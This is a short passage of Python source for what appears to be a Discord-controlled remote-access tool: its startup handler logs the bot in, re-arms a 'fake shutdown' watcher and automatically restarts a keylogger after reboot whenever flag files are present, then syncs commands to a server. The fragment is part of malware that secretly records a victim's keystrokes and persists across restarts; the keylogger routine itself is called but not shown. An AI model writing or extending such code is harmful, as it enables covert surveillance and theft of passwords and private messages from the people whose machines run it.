@bot.event
async def on_ready():
    log(f"logged in as {bot.user}")
    print(f"[{APP_NAME}] online as {bot.user}")
    # Auto re-arm shutdown watcher if the flag persisted across reboot
    if os.path.exists(FAKE_SHUTDOWN_FLAG):
        _start_shutdown_watcher()
    # Auto restart keylogger if it was on
    if os.path.exists(KEYLOG_ON):
        _start_keylogger()
    try:
        guild = bot.get_guild(GUILD_ID)
        if guild:
            await bot.tree.sync(guild=guild)
    except Exception:
        pass

